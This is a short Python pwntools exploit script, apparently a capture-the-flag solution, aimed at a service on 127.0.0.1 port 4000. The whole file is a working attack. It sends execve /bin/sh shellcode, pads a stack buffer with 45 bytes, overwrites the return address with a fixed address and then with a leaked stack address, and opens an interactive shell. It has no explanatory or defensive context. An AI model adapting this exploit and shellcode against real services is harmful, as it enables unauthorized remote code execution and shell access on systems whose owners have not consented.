from pwn import *
import re

s = remote('127.0.0.1', 4000)
s.recv()
s.recv()
s.send('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
s.send('b'*45)
s.send(p64(0x40087e))
s.send('\n')
s.recv()
s.send('1\n')
addr = s.recv()
addr = re.match('.*(0x[a-f0-9]+).*', addr).groups(1)[0]
s.send('3\n')
text = s.recv()
print ':' + addr
print ':' + text
s.send('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
s.send('b'*45)
s.send(p64(int(addr,16)+8))
s.send('\n')
s.interactive()
